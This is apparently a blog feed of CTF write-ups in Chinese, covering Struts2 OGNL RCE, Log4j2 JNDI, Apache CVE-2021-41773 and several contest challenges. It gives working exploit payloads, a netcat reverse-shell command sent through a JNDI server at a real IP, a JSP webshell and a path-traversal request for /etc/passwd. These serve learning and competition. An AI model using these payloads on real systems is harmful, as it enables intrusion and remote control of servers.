2.3.15</code></pre><p>payload:</p><blockquote><p><code>redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D</code></p></blockquote><h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><p><code>S2-019</code></p><p>poc</p><pre><code>?debug=command&amp;expression=#a=(new java.lang.ProcessBuilder(&#39;id&#39;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),#out.getWriter().println(new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()// 利用是先进行url编码    与s2-008poc区别不同的仅仅是由原先的[“allowStaticMethodAccess”]=true静态方法执行改为(new java.lang.ProcessBuilder(‘id’)).start()，但该方法在虚空浪子心提出s2-012后不久就在博客里说明了官方修补方案将allowStaticMethodAccess取消了后的替补方法就是使用ava.lang.ProcessBuilder影响版本：Struts 2.0.0 - Struts 2.3.15.1</code></pre><h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><p><code>S2-029</code></p><pre><code>Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%&#123;&#125;”。最终造成二次执行影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）</code></pre><p>poc:<code>default.action?message=(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream()))</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091614116.png"></p><h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><p><code>S2-032</code></p><pre><code>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用method:&lt;name&gt;的方式来调用名字是&lt;name&gt;的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞影响版本: Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)</code></pre><p>poc:<code>?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env</code></p><h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><p><code>S2-033</code></p><pre><code>当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行影响版本：Struts 2.3.20 – Struts 2.3.28 (不包括 2.3.20.3和 2.3.24.3)</code></pre><p>poc:<code>/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><p><code>S2-037</code></p><pre><code>当使用REST插件启用动态方法调用时，可以传递可用于在服务器端执行任意代码的恶意表达式影响版本：Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</code></pre><p>poc:<code>/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env</code></p><h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p><code>反编译</code></p><p>给了一个<code>war</code>包</p><p>用<a href="https://github.com/java-decompiler/jd-gui/releases"><code>Java decompiler</code></a></p><p>反编译</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649320.png"></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202201091649164.png"><br>payload：<code>/ctfshow/login?username=admin&amp;password=ctfshow</code></p><hr><p><a href="https://blog.csdn.net/q20010619/article/details/120729447">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web279&quot;&gt;&lt;a href=&quot;#web279&quot; class=&quot;headerlink&quot; title=&quot;web279&quot;&gt;&lt;/a&gt;web279&lt;/h2&gt;&lt;p&gt;&lt;code&gt;S2-001&lt;/code&gt;是struts漏洞的编号&lt;/p&gt;
&lt;p&gt;Struts2是用java语言</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/categories/CTF/wp/ctfshow/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="ctfshow" scheme="http://lll-nnn.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2</title>
    <link href="http://lll-nnn.github.io/2021/12/29/Log4j2/"/>
    <id>http://lll-nnn.github.io/2021/12/29/Log4j2/</id>
    <published>2021-12-29T11:28:38.000Z</published>
    <updated>2022-04-17T15:36:33.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-Log4j2-RCE"><a href="#Apache-Log4j2-RCE" class="headerlink" title="Apache Log4j2 RCE"></a>Apache Log4j2 RCE</h2><p>BugKu:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291933557.png"><br>先dnslog看看<br><code>$&#123;jndi:ldap://hhkzdj.dnslog.cn&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291934351.png"><br>有回显，所以存在<code>Log4j2</code></p><p>需要先在自己VPS上搭建一个JNDI服务<br><code>Github: https://github.com/welk1n/JNDI-Injection-Exploit</code><br>git clone 下来</p><pre><code>1.cd JNDI-Injection-Exploit2.mvn clean package -DskipTests     //这一步报错的话直接下载作者给的jar包也行3.java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;命令&quot; -A &quot;VPS_IP&quot;    //开启服务</code></pre><p><code>java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc xxx.xxx.xxx.xxx 9999 -e /bin/sh&quot; -A xxx.xxx.xxx.xxx</code></p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112291941336.png"><br>选择一个<code>JNDI Links</code><br>如：<code>ldap://120.76.136.64:1389/idzbzl</code><br>payload:<code>$&#123;jndi:ldap://120.76.136.64:1389/idzbzl&#125;</code><br>监听端口即可</p><p>参考：<a href="http://vfree.ltd/index.php/archives/386.html">http://vfree.ltd/index.php/archives/386.html</a><br>    <a href="https://www.cnblogs.com/ktsm/p/15695560.html">https://www.cnblogs.com/ktsm/p/15695560.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Apache-Log4j2-RCE&quot;&gt;&lt;a href=&quot;#Apache-Log4j2-RCE&quot; class=&quot;headerlink&quot; title=&quot;Apache Log4j2 RCE&quot;&gt;&lt;/a&gt;Apache Log4j2 RCE&lt;/h2&gt;&lt;p&gt;BugKu:&lt;a h</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="bugku" scheme="http://lll-nnn.github.io/tags/bugku/"/>
    
  </entry>
  
  <entry>
    <title>SCTF2021</title>
    <link href="http://lll-nnn.github.io/2021/12/28/SCTF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/28/SCTF2021/</id>
    <published>2021-12-28T02:43:52.000Z</published>
    <updated>2021-12-28T02:58:52.574Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Loginme"><a href="#Loginme" class="headerlink" title="Loginme"></a>Loginme</h2><p>签到go题</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281045198.png"><br>给了源码</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281046293.png"><br>需要从localhost访问<br><a href="https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP">https://pkg.go.dev/github.com/gin-gonic/gin#Context.ClientIP</a><br>这里</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281047584.png"><br>所以可以用<code>x-real-ip</code><br>然后GET传参age获取admin的password<br><code>age=&#123;&#123;$&#125;`或者`&#123;&#123;.Password&#125;&#125;</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112281050227.png"></p><p><a href="https://team-su.github.io/passages/2021-12-25-SCTF/">Write ups of TEAM-SU</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Loginme&quot;&gt;&lt;a href=&quot;#Loginme&quot; class=&quot;headerlink&quot; title=&quot;Loginme&quot;&gt;&lt;/a&gt;Loginme&lt;/h2&gt;&lt;p&gt;签到go题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="SCTF2021" scheme="http://lll-nnn.github.io/tags/SCTF2021/"/>
    
  </entry>
  
  <entry>
    <title>摆烂杯</title>
    <link href="http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    <id>http://lll-nnn.github.io/2021/12/27/%E6%91%86%E7%83%82%E6%9D%AF/</id>
    <published>2021-12-27T09:50:45.000Z</published>
    <updated>2021-12-27T13:25:09.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271752482.png"></p><p>输入后会将算式式输出</p><p><code>(1)**3+(1)**3+(1)**3=3</code></p><p>不能有0</p><p>构造<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112271755579.png"><br>提交得到flag</p><h2 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">eregi</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ctfsho"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token single-quoted-string string">'w'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token double-quoted-string string">"welcome2ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>需要各个表达式都为false才能得到flag</p><p>payload：<code>?id=a&amp;filename=data://text/plain;base64,d2VsY29tZTJjdGZzaG93t&amp;content=Wdasdasfas</code></p><p><a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc#">摆烂杯WP</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web签到&quot;&gt;&lt;a href=&quot;#web签到&quot; class=&quot;headerlink&quot; title=&quot;web签到&quot;&gt;&lt;/a&gt;web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/ll_nn/pic/raw/master/img/20211</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="摆烂杯" scheme="http://lll-nnn.github.io/tags/%E6%91%86%E7%83%82%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>金盾杯2021</title>
    <link href="http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/"/>
    <id>http://lll-nnn.github.io/2021/12/12/%E9%87%91%E7%9B%BE%E6%9D%AF2021/</id>
    <published>2021-12-12T15:18:53.000Z</published>
    <updated>2021-12-12T15:44:32.589Z</updated>
    
    <content type="html"><![CDATA[<h2 id="上传你的头像吧"><a href="#上传你的头像吧" class="headerlink" title="上传你的头像吧"></a>上传你的头像吧</h2><p><code>文件上传竞争</code></p><p>题目中对于上传的文件是先保存到服务器上再检查是否符合规范才进行删除，所以可以边上传边访问，和删除竞争；在删除前访问到木马文件，得到flag</p><p>上传：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321856.png"><br>访问：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321698.png"></p><h2 id="上传你的压缩包吧"><a href="#上传你的压缩包吧" class="headerlink" title="上传你的压缩包吧"></a>上传你的压缩包吧</h2><p>上传压缩包，会自动解压，<br><code>Tomcat</code></p><p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p><p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p><p>网上的jsp马</p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in &#x3D;Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a &#x3D; -1;byte[] b &#x3D; new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a&#x3D;in.read(b))!&#x3D;-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;&#x2F;pre&gt;&quot;);&#125;%&gt;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122326594.png"></p><h2 id="休想爆破我"><a href="#休想爆破我" class="headerlink" title="休想爆破我"></a>休想爆破我</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122344902.png"><br>扫到<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122329820.png"></p><p><code>heapdump</code>放到<code>visualVM</code>分析<br><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p><p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png"></p><p>脚本对byte转换为base64编码的key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> structa<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>shiro利用工具</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png"></p><p><code>cat /flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;上传你的头像吧&quot;&gt;&lt;a href=&quot;#上传你的头像吧&quot; class=&quot;headerlink&quot; title=&quot;上传你的头像吧&quot;&gt;&lt;/a&gt;上传你的头像吧&lt;/h2&gt;&lt;p&gt;&lt;code&gt;文件上传竞争&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;题目中对于上传的文件是先保存到服务器上再检查是</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="金盾杯" scheme="http://lll-nnn.github.io/tags/%E9%87%91%E7%9B%BE%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-41773</title>
    <link href="http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/"/>
    <id>http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/</id>
    <published>2021-11-29T02:24:01.000Z</published>
    <updated>2022-01-10T14:01:23.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受<code>require all denied</code>保护，则攻击者可以访问这些文件。</p><p>仅apache 2.4.49</p><h2 id="apache-目录穿越"><a href="#apache-目录穿越" class="headerlink" title="apache 目录穿越"></a>apache 目录穿越</h2><p>payload：<code>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><p><code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><h2 id="apache-rce"><a href="#apache-rce" class="headerlink" title="apache rce"></a>apache rce</h2><p>需要启用<code>mod_cgid</code>和<code>mod_cgi</code>模块</p><p><code>mod_cgi</code>模块的功能是根据输入脚本类型选择不同解析器进行执行，常用的解析器有<code>php</code>、<code>perl</code>等</p><p>payload:</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: xx.xx.xx.xx:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://s3.bmp.ovh/imgs/2021/11/0e261738473bf027.png"></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/120655436">CVE-2021-41773 Apache HTTP Server漏洞复现</a>   </p><p><a href="https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ?st=A3E9947CC72763237BE9E767B200882D1648B7C0060F65A11B588C63933F3FDB30F9CE3EEDF8A35AD341979ED668A754DD5F1E2AFCB710029B6DC92BC1A87C0DA439302C4A4AB04FFDE6CC47D2FBA6A5F1A0F2E0EB04443FC9F5A55F12409243D5C0711080FFD5BC323D747C57AEC1B39E37427C6A70C7C19BED4BF6C9C75FCCA459EE690735F1E2A7D4293A25537FCD92375C7254420FB4056BC664796B47A34A1900D539AC737D5321803DC0FB4CE1&vid=1688851090137202&cst=BD2948FD4785C65961435AA26F6775293D3B23260F41BE812666D55A2B47E6459197EF59B0467B11CD18458E3E28819A&deviceid=579d18aa-691c-4ffd-8a54-deef2535f414&version=3.1.16.90294&platform=mac">CVE-2021-41773升华篇-Apache HTTP Server 路径穿越漏洞提升至RCE回显深入分析 </a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h2&gt;&lt;p&gt;攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受&lt;code&gt;require all</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="信息安全" scheme="http://lll-nnn.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CVE" scheme="http://lll-nnn.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Geekchallenge</title>
    <link href="http://lll-nnn.github.io/2021/11/26/geekchallenge/"/>
    <id>http://lll-nnn.github.io/2021/11/26/geekchallenge/</id>
    <published>2021-11-25T16:31:46.000Z</published>
    <updated>2021-12-01T16:22:38.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--if($_REQUEST['mode']!="begin")&#123;    die("Welcome PHP Games!");&#125;--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'mode'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token double-quoted-string string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PHP Games!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"wrong way"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"need a little magic"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"user"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token 